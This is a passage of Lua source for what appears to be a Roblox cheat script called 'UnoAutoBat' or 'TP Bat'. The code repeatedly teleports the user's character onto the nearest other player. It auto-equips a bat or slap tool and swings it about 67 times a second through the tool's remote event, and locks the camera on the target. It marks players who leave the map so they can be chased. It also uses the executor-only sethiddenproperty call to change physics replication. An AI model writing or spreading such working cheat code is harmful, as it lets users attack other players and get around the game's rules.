_G.UnoAutoBat.SetV2Distance(distanceInput.Text)
end)

_G.__batVersionPill = batVersionPill
_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
local function updateBatVersionButton()
_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1)
batVersionPill.BackgroundColor3 = Color3.fromRGB(45, 48, 58)
batVersionPill.TextColor3 = Color3.fromRGB(245, 248, 255)
bvStroke.Color = Color3.fromRGB(220, 225, 235)
versionInsidePill.Text = "V" .. tostring(_G.__batVersion or 1)
versionInsidePill.BackgroundColor3 = Color3.fromRGB(45, 48, 58)
versionInsideStroke.Color = Color3.fromRGB(220, 225, 235)
distanceInput.TextEditable = true
distanceInput.Text = tostring(_G.__tpBatV2Distance or 8)
distanceInput.BackgroundTransparency = 0.05
distanceInput.TextColor3 = Color3.fromRGB(245, 248, 255)
updateDistanceConfigVisibility()
end
_G.__UnoUpdateBatVersionButton = updateBatVersionButton
updateBatVersionButton()

connectBtn(batVersionPill, function()
_G.UnoAutoBat.SetVersion(_G.__batVersion == 1 and 2 or 1)
end)

connectBtn(versionInsidePill, function()
_G.UnoAutoBat.SetVersion(_G.__batVersion == 1 and 2 or 1)
end)

extension.Size = UDim2.new(1, 0, 0, 0)
extension.Visible = false
container.Size = UDim2.new(1, -2, 0, GUI_METRICS.toggleH)

-- The Cursed direct TP Bat has one setting: its keybind.  The V1/V2 and
-- distance controls belonged to the retired engine, so remove them entirely.
_G.__batVersionPill = nil
_G.__UnoUpdateBatVersionButton = function() end
pcall(function() batVersionPill:Destroy() end)
pcall(function() distanceConfigPill:Destroy() end)
pcall(function() distancePanel:Destroy() end)
return 0
end)

pcall(function() styleSmallToggle(tpBatRow) end)
	end

;(function()
pcall(function()
local oldMarker = workspace:FindFirstChild("UnoTPBatLastPosition")
if oldMarker then oldMarker:Destroy() end
end)
local tpBatState = {
enabled = false,
heartbeat = nil,
target = nil,
samples = {},
swingLocked = false,
nextSwingAt = 0,
lastSafeCFrame = nil,
lastPosition = nil,
lastSampleTime = 0,
recoverUntil = 0,
physicsPauseUntil = 0,
previousAutoRotate = nil,
lastTargetMarker = nil,
markerLocked = false,
markerTarget = nil,
markerBodyLock = nil,
markerBodyAttachment = nil,
}
_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
local getRig = (function()
local character = Player.Character
if not character then return nil, nil, nil end
return character, character:FindFirstChild("HumanoidRootPart"), character:FindFirstChildOfClass("Humanoid")
end)

local finiteVector = (function(vector)
return vector ~= nil
and vector.X == vector.X and vector.Y == vector.Y and vector.Z == vector.Z
and math.abs(vector.X) < 10000000
and math.abs(vector.Y) < 10000000
and math.abs(vector.Z) < 10000000
end)

local facingCFrame = (function(position, lookTargetPos, fallbackLook, keepCF)
local flat = Vector3.new(lookTargetPos.X - position.X, 0, lookTargetPos.Z - position.Z)
if flat.Magnitude > 0.05 then
return CFrame.lookAt(position, position + flat.Unit)
end
local flatFallback = fallbackLook and Vector3.new(fallbackLook.X, 0, fallbackLook.Z) or nil
if flatFallback and flatFallback.Magnitude >= 0.01 then
return CFrame.lookAt(position, position + flatFallback.Unit)
end
if keepCF then
local _, yaw = keepCF:ToEulerAnglesYXZ()
return CFrame.new(position) * CFrame.Angles(0, yaw, 0)
end
return CFrame.new(position)
end)

local TP_BAT_MARKER_DISTANCE = 3

local markerEngagementCFrame = (function(root, marker)
if not root or not marker then return nil end
local markerPosition = marker.Position
local away = Vector3.new(
root.Position.X - markerPosition.X,
0,
root.Position.Z - markerPosition.Z
)
if away.Magnitude <= 0.05 then
local look = marker.CFrame.LookVector
away = Vector3.new(-look.X, 0, -look.Z)
end
if away.Magnitude <= 0.05 then away = Vector3.new(0, 0, 1) end
local teleportPosition = markerPosition + away.Unit * TP_BAT_MARKER_DISTANCE
return facingCFrame(teleportPosition, markerPosition, marker.CFrame.LookVector, root.CFrame)
end)

local clearMarkerBodyLock = (function()
if tpBatState.markerBodyLock then
pcall(function() tpBatState.markerBodyLock:Destroy() end)
tpBatState.markerBodyLock = nil
end
if tpBatState.markerBodyAttachment then
pcall(function() tpBatState.markerBodyAttachment:Destroy() end)
tpBatState.markerBodyAttachment = nil
end
end)

local applyMarkerBodyLock = (function(root, marker)

clearMarkerBodyLock()
end)

_G.__UnoTPBatApplyMarkerBodyLock = applyMarkerBodyLock
_G.__UnoTPBatClearMarkerBodyLock = clearMarkerBodyLock

local safeTeleport = (function(root, targetCFrame)
	if not root or not targetCFrame then return false end
	local marker = tpBatState and tpBatState.lastTargetMarker
	if marker and marker.Parent and marker.Transparency and marker.Transparency < 1 then

		return false
	end
	local ok = pcall(function()
		root.AssemblyLinearVelocity = Vector3.zero
		root.AssemblyAngularVelocity = Vector3.zero
		root.CFrame = targetCFrame
		root.AssemblyLinearVelocity = Vector3.zero
		root.AssemblyAngularVelocity = Vector3.zero
	end)
	return ok
end)

local TP_BAT_MIN_X, TP_BAT_MAX_X = -536.2, -422
local TP_BAT_MIN_Y, TP_BAT_MAX_Y = -10, 75
local TP_BAT_MIN_Z, TP_BAT_MAX_Z = -71.8, 192.9
local TP_BAT_MARKER_GROUND_Y = -7
local TP_BAT_MARKER_LOOKBACK = 0.2

local isInsideAllowedArea = (function(position)
if not position then return false end
return position.X >= TP_BAT_MIN_X and position.X <= TP_BAT_MAX_X
and position.Y >= TP_BAT_MIN_Y and position.Y <= TP_BAT_MAX_Y
and position.Z >= TP_BAT_MIN_Z and position.Z <= TP_BAT_MAX_Z
end)

_G.__UnoTPBatIsInsideMap = isInsideAllowedArea

local updateLastTargetMarker = (function(targetCFrame)
if tpBatState.markerLocked then return end

	local tracked = tpBatState.markerTarget
	local character = tracked and tracked.Parent == Players and tracked.Character
	local targetRoot = character and character:FindFirstChild("HumanoidRootPart")
	local humanoid = character and character:FindFirstChildOfClass("Humanoid")
	if not targetRoot or not humanoid or humanoid.Health <= 0
	or not finiteVector(targetRoot.Position) or isInsideAllowedArea(targetRoot.Position) then return end
if not targetCFrame or not isInsideAllowedArea(targetCFrame.Position) then return end

local groundMarkerCFrame = CFrame.new(
targetCFrame.Position.X,
TP_BAT_MARKER_GROUND_Y,
targetCFrame.Position.Z
) * targetCFrame.Rotation
local marker = tpBatState.lastTargetMarker
if not marker or not marker.Parent then
marker = Instance.new("Part")
marker.Name = "UnoTPBatLastPosition"
marker.Shape = Enum.PartType.Ball
marker.Size = Vector3.new(3, 3, 3)
marker.Color = Color3.fromRGB(0, 110, 255)
marker.Material = Enum.Material.Neon
marker.Anchored = true
marker.CanCollide = false
marker.CanTouch = false
marker.CanQuery = false
marker.CastShadow = false
marker.Parent = workspace

local overlaySphere = Instance.new("SphereHandleAdornment")
overlaySphere.Name = "AlwaysOnTopSphere"
overlaySphere.Adornee = marker
overlaySphere.Radius = 1.55
overlaySphere.Color3 = Color3.fromRGB(0, 125, 255)
overlaySphere.Transparency = 0.05
overlaySphere.AlwaysOnTop = true
overlaySphere.Visible = true
overlaySphere.ZIndex = 10
overlaySphere.Parent = marker

local highlight = Instance.new("Highlight")
highlight.Name = "LastPositionHighlight"
highlight.Adornee = marker
highlight.FillColor = Color3.fromRGB(0, 110, 255)
highlight.FillTransparency = 0.15
highlight.OutlineColor = Color3.fromRGB(120, 200, 255)
highlight.OutlineTransparency = 0
highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
highlight.Enabled = true
highlight.Parent = marker

local billboard = Instance.new("BillboardGui")
billboard.Name = "LastPositionLabel"
billboard.Size = UDim2.new(0, 110, 0, 20)
billboard.StudsOffset = Vector3.new(0, 2.1, 0)
billboard.AlwaysOnTop = true
billboard.Adornee = marker
billboard.Parent = marker

local label = Instance.new("TextLabel")
label.Name = "Text"
label.Size = UDim2.fromScale(1, 1)
label.BackgroundTransparency = 1
label.Text = "ultima posicion"
label.TextColor3 = Color3.fromRGB(220, 235, 255)
label.TextStrokeColor3 = Color3.fromRGB(0, 35, 90)
label.TextStrokeTransparency = 0.25
label.TextSize = 11
label.Font = Enum.Font.GothamMedium
label.Parent = billboard

tpBatState.lastTargetMarker = marker
end
marker.Transparency = 0
local overlaySphere = marker:FindFirstChild("AlwaysOnTopSphere")
if overlaySphere then overlaySphere.Visible = true end
local highlight = marker:FindFirstChild("LastPositionHighlight")
if highlight then highlight.Enabled = true end
local billboard = marker:FindFirstChild("LastPositionLabel")
if billboard then billboard.Enabled = true end
marker.CFrame = groundMarkerCFrame
tpBatState.markerLocked = true
end)

local clearLastTargetMarker = (function()
tpBatState.markerLocked = false
clearMarkerBodyLock()
if tpBatState.lastTargetMarker then
pcall(function()
tpBatState.lastTargetMarker.Transparency = 1
local overlaySphere = tpBatState.lastTargetMarker:FindFirstChild("AlwaysOnTopSphere")
if overlaySphere then overlaySphere.Visible = false end
local highlight = tpBatState.lastTargetMarker:FindFirstChild("LastPositionHighlight")
if highlight then highlight.Enabled = false end
local billboard = tpBatState.lastTargetMarker:FindFirstChild("LastPositionLabel")
if billboard then billboard.Enabled = false end
end)
end
end)

_G.__UnoTPBatGetMarkerCFrame = function()
local marker = tpBatState.lastTargetMarker
if tpBatState.markerLocked and marker and marker.Parent and marker.Transparency < 1 then
local tracked = tpBatState.markerTarget
local trackedRoot = tracked and tracked.Character and tracked.Character:FindFirstChild("HumanoidRootPart")
if trackedRoot and isInsideAllowedArea(trackedRoot.Position) then
clearLastTargetMarker()
return nil
end
local _, root = getRig()
return markerEngagementCFrame(root, marker) or marker.CFrame
end
return nil
end

_G.__UnoTPBatTrackTarget = function(player)
if tpBatState.markerLocked then return tpBatState.markerTarget end

local current = tpBatState.markerTarget
local currentCharacter = current and current.Parent == Players and current.Character
local currentHumanoid = currentCharacter and currentCharacter:FindFirstChildOfClass("Humanoid")
local currentRoot = currentCharacter and currentCharacter:FindFirstChild("HumanoidRootPart")
local currentSample = current and tpBatState.samples[current]
if current and current.Parent == Players then

if currentHumanoid and currentHumanoid.Health > 0
and ((currentRoot and isInsideAllowedArea(currentRoot.Position))
or (currentSample and currentSample.safeCFrame)) then return current end
if not currentHumanoid and currentSample and currentSample.safeCFrame then return current end
end
if player and player ~= Player and player.Parent == Players then
tpBatState.markerTarget = player
return player
end
return tpBatState.markerTarget
end

_G.__UnoTPBatClearMarkerTracking = function()
tpBatState.target = nil

end

local targetAlive = (function(player, myRoot)
if not player or player.Parent ~= Players or not player.Character then return false end
local root = player.Character:FindFirstChild("HumanoidRootPart")
local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
if not root or not humanoid or humanoid.Health <= 0 or not isInsideAllowedArea(root.Position) then
return false
end
return true
end)

local getSnapshotBeforeExit = (function(sample, now)
if not sample or not sample.history or #sample.history == 0 then return nil end
local cutoff = now - TP_BAT_MARKER_LOOKBACK
local selected = nil
for _, entry in ipairs(sample.history) do
if entry.time <= cutoff then
selected = entry
else
break
end
end

return selected or sample.history[1]
end)

_G.__UnoTPBatForceMarker = function(player, fallbackCFrame)
if player and player.Parent == Players then
tpBatState.markerTarget = player
end
local sample = player and tpBatState.samples[player]
local snapshot = getSnapshotBeforeExit(sample, tick())
local remembered = snapshot and snapshot.safeCFrame or (sample and sample.safeCFrame)
if not remembered and fallbackCFrame and isInsideAllowedArea(fallbackCFrame.Position) then
remembered = fallbackCFrame
end
if remembered then updateLastTargetMarker(remembered) end
return _G.__UnoTPBatGetMarkerCFrame()
end

local monitorLastTarget = (function()
local _, myRoot = getRig()
if not myRoot then return end

local tracked = tpBatState.markerTarget
	if tracked and tracked.Parent == Players then
local targetRoot = tracked.Character and tracked.Character:FindFirstChild("HumanoidRootPart")
local targetHumanoid = tracked.Character and tracked.Character:FindFirstChildOfClass("Humanoid")
local sample = tpBatState.samples[tracked] or {}
tpBatState.samples[tracked] = sample

if targetRoot and targetHumanoid and targetHumanoid.Health > 0 and finiteVector(targetRoot.Position) then
if isInsideAllowedArea(targetRoot.Position) then
local now = tick()
if tpBatState.markerLocked then
sample.history = {}
end
sample.history = sample.history or {}
table.insert(sample.history, {
time = now,
safePosition = targetRoot.Position,
safeCFrame = targetRoot.CFrame,
})

while sample.history[1] and now - sample.history[1].time > (TP_BAT_MARKER_LOOKBACK + 0.25) do
table.remove(sample.history, 1)
end
sample.safePosition = targetRoot.Position
sample.safeCFrame = targetRoot.CFrame
clearLastTargetMarker()
else
local snapshot = getSnapshotBeforeExit(sample, tick())
updateLastTargetMarker((snapshot and snapshot.safeCFrame) or sample.safeCFrame)
end
end
		if (targetHumanoid and targetHumanoid.Health <= 0)
		or (not targetRoot and not sample.safeCFrame) then
		tpBatState.markerTarget = nil
		clearLastTargetMarker()
		else
		return
		end
end

local closest, closestDistanceSq = nil, math.huge
for _, player in ipairs(Players:GetPlayers()) do
if player ~= Player and targetAlive(player) then
local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
local delta = targetRoot.Position - myRoot.Position
local distanceSq = delta:Dot(delta)
if distanceSq < closestDistanceSq then
closest = player
closestDistanceSq = distanceSq
end
end
end

if closest then
tpBatState.markerTarget = closest
local targetRoot = closest.Character:FindFirstChild("HumanoidRootPart")
local sample = tpBatState.samples[closest] or {}
tpBatState.samples[closest] = sample
sample.safePosition = targetRoot.Position
sample.safeCFrame = targetRoot.CFrame
sample.history = {
{ time = tick(), safePosition = targetRoot.Position, safeCFrame = targetRoot.CFrame }
}
end
end)

local markerMonitorAccumulator = 0
local TP_BAT_MARKER_INTERVAL = 1 / 60
local markerMonitor = RunService.Heartbeat:Connect((function(dt)

markerMonitorAccumulator = markerMonitorAccumulator + (dt or 0)
if markerMonitorAccumulator < TP_BAT_MARKER_INTERVAL then return end
markerMonitorAccumulator = markerMonitorAccumulator % TP_BAT_MARKER_INTERVAL
monitorLastTarget()
end))
_G.__UnoTrackConn(markerMonitor)

local function followPreservedMarker(root)
local markerCFrame = _G.__UnoTPBatGetMarkerCFrame()
if not markerCFrame then
clearMarkerBodyLock()
return false
end
pcall(function()
root.AssemblyLinearVelocity = Vector3.zero
root.AssemblyAngularVelocity = Vector3.zero
root.CFrame = markerCFrame
root.AssemblyLinearVelocity = Vector3.zero
root.AssemblyAngularVelocity = Vector3.zero
end)
local marker = tpBatState.lastTargetMarker
if marker then applyMarkerBodyLock(root, marker) end
return true
end
_G.__UnoTrackStopper(function() pcall(clearLastTargetMarker) end)

	do
	local tpBatState = {
	enabled = false,
	heartbeat = nil,
	target = nil,
	samples = {},
	swingLocked = false,
	nextSwingAt = 0,
	lastSafeCFrame = nil,
	lastPosition = nil,
	lastSampleTime = 0,
	recoverUntil = 0,
	physicsPauseUntil = 0,
	previousAutoRotate = nil,
	lastTargetMarker = nil,
	markerLocked = false,
	markerTarget = nil,
	}
	_G.__batVersion = tonumber(_G.__batVersion) == 2 and 2 or 1
	local TP_BAT_RATE = 67
	local TP_BAT_COOLDOWN = 1 / TP_BAT_RATE

	local BAT_NAMES = {
	"Bat", "Slap", "Iron Slap", "Gold Slap", "Diamond Slap",
	"Emerald Slap", "Ruby Slap", "Dark Matter Slap", "Flame Slap",
	"Nuclear Slap", "Galaxy Slap", "Glitched Slap",
	}

	local function getRig()
	local character = Player.Character
	if not character then return nil, nil, nil end
	return character, character:FindFirstChild("HumanoidRootPart"), character:FindFirstChildOfClass("Humanoid")
	end

	local function findBat(equip)
	local character, _, humanoid = getRig()
	if not character then return nil end

	for _, name in ipairs(BAT_NAMES) do
	local tool = character:FindFirstChild(name)
	if tool and tool:IsA("Tool") then return tool end
	end
	for _, child in ipairs(character:GetChildren()) do
	if child:IsA("Tool") then
	local name = child.Name:lower()
	if name:find("bat", 1, true) or name:find("slap", 1, true) then
	return child
	end
	end
	end

	local backpack = Player:FindFirstChildOfClass("Backpack")
	if backpack then
	local found = nil
	for _, name in ipairs(BAT_NAMES) do
	local tool = backpack:FindFirstChild(name)
	if tool and tool:IsA("Tool") then found = tool; break end
	end
	if not found then
	for _, child in ipairs(backpack:GetChildren()) do
	if child:IsA("Tool") then
	local name = child.Name:lower()
	if name:find("bat", 1, true) or name:find("slap", 1, true) then
	found = child
	break
	end
	end
	end
	end
	if found and equip and humanoid then
	pcall(function() humanoid:EquipTool(found) end)
	end
	return found
	end
	return nil
	end

	local function finiteVector(vector)
	return vector.X == vector.X and vector.Y == vector.Y and vector.Z == vector.Z
	and math.abs(vector.X) < 10000000
	and math.abs(vector.Y) < 10000000
	and math.abs(vector.Z) < 10000000
	end

	local function facingCFrame(position, lookTargetPos, fallbackLook, keepCF)
	local flat = Vector3.new(lookTargetPos.X - position.X, 0, lookTargetPos.Z - position.Z)
	if flat.Magnitude > 0.05 then
	return CFrame.lookAt(position, position + flat.Unit)
	end
	local flatFallback = fallbackLook and Vector3.new(fallbackLook.X, 0, fallbackLook.Z) or nil
	if flatFallback and flatFallback.Magnitude >= 0.01 then
	return CFrame.lookAt(position, position + flatFallback.Unit)
	end
	if keepCF then
	local _, yaw = keepCF:ToEulerAnglesYXZ()
	return CFrame.new(position) * CFrame.Angles(0, yaw, 0)
	end
	return CFrame.new(position)
	end

	local function isInsideAllowedArea(position)
	return position ~= nil
	end

	local function clearLastTargetMarker() end
	local function targetAlive(player, myRoot)
	if not player or player.Parent ~= Players or not player.Character then return false end
	local root = player.Character:FindFirstChild("HumanoidRootPart")
	local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
	if not root or not humanoid or humanoid.Health <= 0 or not finiteVector(root.Position) then
	return false
	end
	local sample = tpBatState.samples[player]
	return _G.__UnoTPBatIsInsideMap(root.Position)
	or (sample ~= nil and sample.safeCFrame ~= nil)
	end

	local function getRememberedTargetCFrame(player, myRoot)
	local sample = player and tpBatState.samples[player]
	local saved = sample and sample.safeCFrame
	if saved and isInsideAllowedArea(saved.Position)
	and (not myRoot or isInsideAllowedArea(saved.Position)) then
	return saved
	end
	return nil
	end

	local function closestTarget(myRoot)

	local tracked = _G.__UnoTPBatTrackTarget(tpBatState.target)
	if targetAlive(tracked, myRoot) then
	tpBatState.target = tracked
	return tracked
	end
	if targetAlive(tpBatState.target, myRoot) then return tpBatState.target end

	local closest = nil
	local closestDistance = math.huge
	for _, player in ipairs(Players:GetPlayers()) do
	if player ~= Player and targetAlive(player, myRoot) then
	local root = player.Character:FindFirstChild("HumanoidRootPart")
	if root then
	local distance = (root.Position - myRoot.Position).Magnitude
	if distance < closestDistance then
	closest = player
	closestDistance = distance
	end
	end
	end
	end
	if closest then
	tpBatState.target = closest
	_G.__UnoTPBatTrackTarget(closest)
	end
	return closest
	end

	local function getTPBatDistance()
	local distance = tonumber(_G.__tpBatV2Distance)
	if not distance or distance ~= distance then return 8 end
	return math.clamp(distance, 0, 100)
	end

	local function swingBat()
	local now = tick()
	if tpBatState.swingLocked or now < tpBatState.nextSwingAt then return end
	tpBatState.swingLocked = true
	tpBatState.nextSwingAt = now + TP_BAT_COOLDOWN

	pcall(function()
	local character = Player.Character
	if not character then return end
	local tool = findBat(true)
	if not tool then return end
	if tool.Parent ~= character then
	local humanoid = character:FindFirstChildOfClass("Humanoid")
	if humanoid then humanoid:EquipTool(tool) end
	end
	tool:Activate()
	local remote = tool:FindFirstChildWhichIsA("RemoteEvent", true)
	if remote then pcall(function() remote:FireServer() end) end
	end)

	task.delay(TP_BAT_COOLDOWN, function()
	tpBatState.swingLocked = false
	end)
	end

	local function resetPhysicsRoot(root)
	if sethiddenproperty then
	pcall(function() sethiddenproperty(root, "PhysicsRepRootPart", root) end)
	end
	end

	local function desktopHeartbeatStep()
	if not tpBatState.enabled then return end
	local character, root, humanoid = getRig()
	if not character or not root or not humanoid or humanoid.Health <= 0 then return end

	if followPreservedMarker(root) then
	swingBat()
	return
	end
	if tpBatState.previousAutoRotate == nil then tpBatState.previousAutoRotate = humanoid.AutoRotate end
	humanoid.AutoRotate = false

	findBat(true)
	local target = closestTarget(root)
	if target then
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local rememberedCFrame = getRememberedTargetCFrame(target, root)

	if not targetRoot or not finiteVector(targetRoot.Position) then return end
	if not _G.__UnoTPBatIsInsideMap(targetRoot.Position) then
	_G.__UnoTPBatForceMarker(target, rememberedCFrame)
	if followPreservedMarker(root) then swingBat() end
	return
	end
	local targetCFrame = targetRoot.CFrame
	local sample = tpBatState.samples[target] or {}
	tpBatState.samples[target] = sample
	sample.safeCFrame = targetRoot.CFrame
	sample.safePosition = targetRoot.Position
	local targetPos = targetCFrame.Position + Vector3.new(0, 0.9, 0)
	local targetLook = targetCFrame.LookVector
		if (root.Position - targetPos).Magnitude > getTPBatDistance() then

		safeTeleport(root, facingCFrame(targetPos, targetCFrame.Position, targetLook, root.CFrame))
		else

		safeTeleport(root, facingCFrame(root.Position, targetCFrame.Position, targetLook, root.CFrame))
		end

	if sethiddenproperty then
	pcall(function()
	if targetRoot then sethiddenproperty(root, "PhysicsRepRootPart", targetRoot) end
	end)
	end
	local cam = workspace.CurrentCamera
	if cam then
	pcall(function() cam.CFrame = CFrame.new(cam.CFrame.Position, targetCFrame.Position) end)
	end
	swingBat()
	end
	end

	local function zurichV2HeartbeatStep()
	if not tpBatState.enabled then return end
	local character, root, humanoid = getRig()
	if not character or not root or not humanoid or humanoid.Health <= 0 then return end

	if followPreservedMarker(root) then
	swingBat()
	return
	end
	if tpBatState.previousAutoRotate == nil then tpBatState.previousAutoRotate = humanoid.AutoRotate end
	humanoid.AutoRotate = false

	local target = closestTarget(root)
	if not target then return end
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local rememberedCFrame = getRememberedTargetCFrame(target, root)
	local targetCFrame = targetRoot and targetRoot.CFrame or rememberedCFrame
	local usingRememberedPosition = not targetRoot
	local markerTrigger = false

	if targetRoot then
	local sample = tpBatState.samples[target] or {}
	tpBatState.samples[target] = sample
	markerTrigger = targetRoot.Position.Y < -9
	or not _G.__UnoTPBatIsInsideMap(targetRoot.Position)
	or not finiteVector(targetRoot.Position)
	local validSnapshot = finiteVector(targetRoot.Position)
	and _G.__UnoTPBatIsInsideMap(targetRoot.Position)
	if validSnapshot then
	sample.safeCFrame = targetRoot.CFrame
	sample.safePosition = targetRoot.Position
	else
	targetCFrame = rememberedCFrame
	usingRememberedPosition = true
	end
	end

	if not targetCFrame then return end
	if usingRememberedPosition and markerTrigger then
	_G.__UnoTPBatForceMarker(target, targetCFrame)
	if followPreservedMarker(root) then
	swingBat()
	return
	end
	end

	local targetPosition = targetCFrame.Position
	if not usingRememberedPosition then
	targetPosition = targetPosition + Vector3.new(0, 0.9, 0)
	end
	local engagement
	if (root.Position - targetPosition).Magnitude > getTPBatDistance() then
	engagement = facingCFrame(targetPosition, targetCFrame.Position, targetCFrame.LookVector, root.CFrame)
	else
	engagement = facingCFrame(root.Position, targetCFrame.Position, targetCFrame.LookVector, root.CFrame)
	end
	safeTeleport(root, engagement)

	if sethiddenproperty then
	pcall(function()
	if targetRoot then sethiddenproperty(root, "PhysicsRepRootPart", targetRoot) end
	end)
	end
	local camera = workspace.CurrentCamera
	if camera then
	pcall(function() camera.CFrame = CFrame.new(camera.CFrame.Position, targetCFrame.Position) end)
	end
	swingBat()
	end

	local function inspectMobileTarget(player, targetRoot, myRoot)
	if not targetAlive(player, myRoot) or not targetRoot then return true, nil end

	local now = tick()
	local position = targetRoot.Position
	local velocity = targetRoot.AssemblyLinearVelocity
	local sample = tpBatState.samples[player] or {}
	tpBatState.samples[player] = sample

	local destroyHeight = workspace.FallenPartsDestroyHeight or -500
	local voidFloor = math.max(destroyHeight + 90, -50)
	local deltaTime = sample.time and math.max(now - sample.time, 1 / 240) or math.huge
	local delta = sample.position and (position - sample.position) or Vector3.zero
	local impossibleStep = sample.position ~= nil and deltaTime < 0.4 and (delta.Magnitude > 90 or math.abs(delta.Y) > 38)
	local badVelocity = not finiteVector(velocity) or velocity.Magnitude > 100 or math.abs(velocity.Y) > 150
	local badPosition = not finiteVector(position) or position.Y <= voidFloor or position.Y > 650 or (myRoot and (position - myRoot.Position).Magnitude > 4000)

	if badPosition or badVelocity or impossibleStep then
	sample.suspiciousUntil = now + 1.35
	elseif now >= (sample.suspiciousUntil or 0) then
	sample.safePosition = position
	sample.safeCFrame = targetRoot.CFrame
	end
	sample.position = position
	sample.time = now
	return now < (sample.suspiciousUntil or 0), sample
	end

	local function guardMobileAgainstVoid(root, humanoid, targetRoot)
	local now = tick()
	local position = root.Position
	local velocity = root.AssemblyLinearVelocity
	local destroyHeight = workspace.FallenPartsDestroyHeight or -500
	local voidFloor = math.max(destroyHeight + 80, -55)
	local deltaTime = now - (tpBatState.lastSampleTime or now)
	local suddenDrop = tpBatState.lastPosition and deltaTime <= 0.35 and position.Y < tpBatState.lastPosition.Y - 40
	local suddenRise = tpBatState.lastPosition and deltaTime <= 0.35 and position.Y > tpBatState.lastPosition.Y + 25
	local forcedLaunch = math.abs(velocity.Y) > 90 or velocity.Magnitude > 450
	local invalidHeight = position.Y <= voidFloor or position.Y > 400
	local recovering = now < tpBatState.recoverUntil

	if invalidHeight or suddenDrop or suddenRise or forcedLaunch then
	resetPhysicsRoot(root)
	local recovery = tpBatState.lastSafeCFrame
	if targetRoot and targetRoot.Parent and targetRoot.Position.Y > voidFloor + 10 and targetRoot.Position.Y < 350 then
	local positionOnTarget = targetRoot.Position + Vector3.new(0, 0.9, 0)
	recovery = facingCFrame(positionOnTarget, targetRoot.Position, targetRoot.CFrame.LookVector)
	end
	pcall(function()
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	humanoid.PlatformStand = false
	humanoid.Sit = false
	humanoid.AutoRotate = true
	humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
	if recovery then safeTeleport(root, recovery) end
	end)
	tpBatState.recoverUntil = now + 0.55
	tpBatState.physicsPauseUntil = now + 0.20
	recovering = true
	elseif not recovering and position.Y > voidFloor + 15 and math.abs(velocity.Y) < 85 and position.Y < 250 then
	tpBatState.lastSafeCFrame = root.CFrame
	end

	if recovering then
	pcall(function()
	root.AssemblyLinearVelocity = Vector3.zero
	root.AssemblyAngularVelocity = Vector3.zero
	if targetRoot and targetRoot.Parent and targetRoot.Position.Y > voidFloor + 10 and targetRoot.Position.Y < 350 then
	safeTeleport(root, facingCFrame(targetRoot.Position + Vector3.new(0, 0.9, 0), targetRoot.Position, targetRoot.CFrame.LookVector))
	elseif tpBatState.lastSafeCFrame then
	safeTeleport(root, facingCFrame(root.Position, root.Position, nil, tpBatState.lastSafeCFrame))
	end
	end)
	resetPhysicsRoot(root)
	end

	tpBatState.lastPosition = root.Position
	tpBatState.lastSampleTime = now
	return recovering
	end

	local function mobileHeartbeatStep()
	if not tpBatState.enabled then return end
	local character, root, humanoid = getRig()
	if not character or not root or not humanoid or humanoid.Health <= 0 then return end

	if followPreservedMarker(root) then
	swingBat()
	return
	end
	if tpBatState.previousAutoRotate == nil then tpBatState.previousAutoRotate = humanoid.AutoRotate end
	humanoid.AutoRotate = false

	findBat(true)
	local target = closestTarget(root)
	if target then
	local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
	local rememberedCFrame = getRememberedTargetCFrame(target, root)
	local targetLeftMap = targetRoot and not _G.__UnoTPBatIsInsideMap(targetRoot.Position)
	if targetLeftMap then targetRoot = nil end
	if targetRoot or rememberedCFrame then
	local suspicious, sample = false, tpBatState.samples[target]
	if targetRoot then suspicious, sample = inspectMobileTarget(target, targetRoot, root) end
	if guardMobileAgainstVoid(root, humanoid, suspicious and nil or targetRoot) then
	swingBat()
	return
	end

	local targetPosition
	if suspicious then
	targetPosition = sample and sample.safePosition
	if not targetPosition and tpBatState.lastSafeCFrame then targetPosition = tpBatState.lastSafeCFrame.Position end
	if not targetPosition then targetPosition = root.Position end
	elseif targetRoot then
	local velocity = targetRoot.AssemblyLinearVelocity
	local prediction = Vector3.new(velocity.X, 0, velocity.Z) * 0.05
	targetPosition = targetRoot.Position + Vector3.new(0, 0.9, 0) + prediction
	else
	targetPosition = rememberedCFrame.Position
	end

	if targetRoot and not suspicious and targetPosition.Y < -20 then
	targetPosition = Vector3.new(targetPosition.X, root.Position.Y, targetPosition.Z)
	end

	local targetCFrame = targetRoot and targetRoot.CFrame or rememberedCFrame
	local engagement = facingCFrame(targetPosition, targetCFrame.Position, targetCFrame.LookVector, tpBatState.lastSafeCFrame)
	safeTeleport(root, engagement)
	pcall(function()
	if targetRoot then
	local targetVelocity = targetRoot.AssemblyLinearVelocity
	root.AssemblyLinearVelocity = Vector3.new(targetVelocity.X, 0, targetVelocity.Z)
	end
	root.AssemblyAngularVelocity = Vector3.zero
	end)
	tpBatState.lastSafeCFrame = engagement

	if sethiddenproperty and tick() >= tpBatState.physicsPauseUntil then
	pcall(function()
	if targetRoot then sethiddenproperty(root, "PhysicsRepRootPart", targetRoot) end
	end)
	end

	local camera = workspace.CurrentCamera
	if camera then pcall(function() camera.CFrame = CFrame.new(camera.CFrame.Position, targetCFrame.Position) end) end
	swingBat()
	end
	end
	end

	local function selectedHeartbeatStep()
	if _G.__batVersion == 2 then
	return zurichV2HeartbeatStep()
	end

	return desktopHeartbeatStep()
	end

	local function stopTPBat()
	local wasEnabled = tpBatState.enabled
	local stopGeneration = tpBatState.returnGeneration
	clearMarkerBodyLock()
	tpBatState.enabled = false
	if tpBatState.heartbeat then
	tpBatState.heartbeat:Disconnect()
	tpBatState.heartbeat = nil
	end
	tpBatState.target = nil
	tpBatState.samples = {}
	tpBatState.swingLocked = false

	local _, root, humanoid = getRig()
	if root then

	local velocity = root.AssemblyLinearVelocity
	local horizontal = Vector3.new(velocity.X, 0, velocity.Z)
	if horizontal.Magnitude > 120 then horizontal = horizontal.Unit * 120 end
